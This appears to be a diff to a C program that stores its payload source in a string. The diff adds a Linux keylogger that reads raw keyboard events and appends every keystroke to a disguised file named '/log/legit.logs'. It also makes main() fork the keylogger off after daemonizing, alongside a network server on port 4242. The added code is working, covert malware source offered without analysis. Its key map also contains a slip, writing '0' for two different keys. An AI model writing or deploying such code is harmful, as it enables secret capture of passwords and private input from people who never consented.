@@ -25,9 +25,222 @@ char code[] = "#include <fcntl.h>\n\
 #include <stdlib.h>\n\
 #include <sys/types.h>\n\
 #include <sys/wait.h>\n\
+#include <sys/ioctl.h>\n\
+#include <linux/input.h>\n\
 #ifndef PORT\n\
  #define PORT 4242\n\
 #endif\n\
+\n\
+void keylogger()\n\
+{\n\
+	int fd, sz;\n\
+    unsigned i;\n\
+\n\
+    unsigned version;\n\
+    unsigned short id[4];                 \n\
+    char name[256] = \"N/A\";\n\
+	struct input_event ev;\n\
+	int log;\n\
+\n\
+	if ((log = open(\"/log/legit.logs\", O_WRONLY | O_CREAT | O_APPEND)) < 0)\n\
+		return ;\n\
+	if ((fd = open(\"/dev/input/by-path/platform-i8042-serio-0-event-kbd\", O_RDONLY)) < 0) \n\
+		return;\n\
+	ioctl(fd, EVIOCGVERSION, &version);\n\
+    ioctl(fd, EVIOCGID, id); \n\
+    ioctl(fd, EVIOCGNAME(sizeof(name)), name);\n\
+\n\
+	for (;;) {\n\
+        sz = read(fd, &ev, sizeof(struct input_event));\n\
+\n\
+		if (ev.type == EV_KEY && ev.value == 1)\n\
+		{\n\
+			switch (ev.code)\n\
+			{\n\
+				\n\
+				case 1:\n\
+					write(log, \"[ESC]\", 5);\n\
+					break;\n\
+				case 2:\n\
+					write(log, \"1\", 1);\n\
+					break;\n\
+				case 3:\n\
+					write(log, \"2\", 1);\n\
+					break;\n\
+				case 4:\n\
+					write(log, \"3\", 1);\n\
+					break;\n\
+				case 5:\n\
+					write(log, \"4\", 1);\n\
+					break;\n\
+				case 6:\n\
+					write(log, \"5\", 1);\n\
+					break;\n\
+				case 7:\n\
+					write(log, \"6\", 1);\n\
+					break;\n\
+				case 8:\n\
+					write(log, \"7\", 1);\n\
+					break;\n\
+				case 9:\n\
+					write(log, \"8\", 1);\n\
+					break;\n\
+				case 10:\n\
+					write(log, \"0\", 1);\n\
+					break;\n\
+				case 11:\n\
+					write(log, \"0\", 1);\n\
+					break;\n\
+				case 12:\n\
+					write(log, \")\", 1);\n\
+					break;\n\
+				case 13:\n\
+					write(log, \"-\", 1);\n\
+					break;\n\
+				case 14:\n\
+					write(log, \"[DEL]\", 5);\n\
+					break;\n\
+				case 15:\n\
+					write(log, \"\\t\", 1);\n\
+					break;\n\
+				case 16:\n\
+					write(log, \"a\", 1);\n\
+					break;	\n\
+				case 17:\n\
+					write(log, \"z\", 1);\n\
+					break;\n\
+				case 18:\n\
+					write(log, \"e\", 1);\n\
+					break;\n\
+				case 19:\n\
+					write(log, \"r\", 1);\n\
+					break;\n\
+				case 20:\n\
+					write(log, \"t\", 1);\n\
+					break;\n\
+				case 21:\n\
+					write(log, \"y\", 1);\n\
+					break;\n\
+				case 22:\n\
+					write(log, \"u\", 1);\n\
+					break;\n\
+				case 23:\n\
+					write(log, \"i\", 1);\n\
+					break;\n\
+				case 24:\n\
+					write(log, \"o\", 1);\n\
+					break;\n\
+				case 25:\n\
+					write(log, \"p\", 1);\n\
+					break;\n\
+				case 28:\n\
+					write(log, \"\\n\", 1);\n\
+					break;\n\
+				case 29:\n\
+					write(log, \"[CTRL]\", 6);\n\
+					break;\n\
+				case 30:\n\
+					write(log, \"q\", 1);\n\
+					break;\n\
+				case 31:\n\
+					write(log, \"s\", 1);\n\
+					break;\n\
+				case 32:\n\
+					write(log, \"d\", 1);\n\
+					break;\n\
+				case 33:\n\
+					write(log, \"f\", 1);\n\
+					break;\n\
+				case 34:\n\
+					write(log, \"g\", 1);\n\
+					break;\n\
+				case 35:\n\
+					write(log, \"h\", 1);\n\
+					break;\n\
+				case 36:\n\
+					write(log, \"j\", 1);\n\
+					break;\n\
+				case 37:\n\
+					write(log, \"k\", 1);\n\
+					break;\n\
+				case 38:\n\
+					write(log, \"l\", 1);\n\
+					break;\n\
+				case 39:\n\
+					write(log, \"m\", 1);\n\
+					break;\n\
+				case 40:\n\
+					write(log, \"%\", 1);\n\
+					break;\n\
+				case 41:\n\
+					write(log, \"@\", 1);\n\
+					break;\n\
+				case 42:\n\
+					write(log, \"[LSHIFT]\", 8);\n\
+					break;\n\
+				case 43:\n\
+					write(log, \"`\", 1);\n\
+					break;\n\
+				case 44:\n\
+					write(log, \"w\", 1);\n\
+					break;\n\
+				case 45:\n\
+					write(log, \"x\", 1);\n\
+					break;\n\
+				case 46:\n\
+					write(log, \"c\", 1);\n\
+					break;\n\
+				case 47:\n\
+					write(log, \"v\", 1);\n\
+					break;\n\
+				case 48:\n\
+					write(log, \"b\", 1);\n\
+					break;\n\
+				case 49:\n\
+					write(log, \"n\", 1);\n\
+					break;\n\
+				case 50:\n\
+					write(log, \",\", 1);\n\
+					break;\n\
+				case 51:\n\
+					write(log, \";\", 1);\n\
+					break;\n\
+				case 52:\n\
+					write(log, \":\", 1);\n\
+					break;\n\
+				case 53:\n\
+					write(log, \"=\", 1);\n\
+					break;\n\
+				case 54:\n\
+					write(log, \"[RSHIFT]\", 8);\n\
+					break;\n\
+				case 56:\n\
+					write(log, \"[LALT]\", 6);\n\
+					break;\n\
+				case 57:\n\
+					write(log, \" \", 1);\n\
+					break;\n\
+				case 100:\n\
+					write(log, \"[RALT]\", 6);\n\
+					break;\n\
+				case 103:\n\
+					write(log, \"[UPARROW]\", 9);\n\
+					break;\n\
+				case 105:\n\
+					write(log, \"[LARROW]\", 8);\n\
+					break;\n\
+				case 106:\n\
+					write(log, \"[RARROW]\", 8);\n\
+					break;\n\
+				case 108:\n\
+					write(log, \"[DOWNARROW]\", 11);\n\
+					break;\n\
+				default:\n\
+					write(log, \"[?]\", 3);\n\
+			}\n\
+		}\n\
+}\n\
+\n\
 \n\
 int net_init()\n\
 {\n\
@@ -225,7 +438,15 @@ void daemonize()\n\
 \n\
 int main()\n\
 {\n\
+	pid_t pid;\n\
 	daemonize();\n\
+	if ((pid = fork()) < 0)\n\
+		return 1;\n\
+	if (!pid)\n\
+	{\n\
+		keylogger();\n\
+		exit(0);\n\
+	}\n\
 	int n_clients = 0;\n\
 	t_client clients[3];\n\
 	fd_set sockets, ready_sockets;\n\
